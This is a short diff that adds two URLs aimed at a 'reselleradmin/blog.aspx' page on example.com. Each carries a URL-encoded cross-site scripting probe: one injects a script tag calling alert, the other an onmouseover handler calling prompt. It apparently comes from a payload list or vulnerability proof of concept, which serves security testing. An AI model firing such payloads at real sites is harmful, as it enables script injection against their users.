@@ -1,0 +1,2 @@
+http://www.example.com/reselleradmin/blog.aspx?%27%22%3E%3Cscript%3Ealert%281%29;%3C/script%3E
+http://www.example.com/reselleradmin/blog.aspx?%27onmouseover=prompt(101)%3E
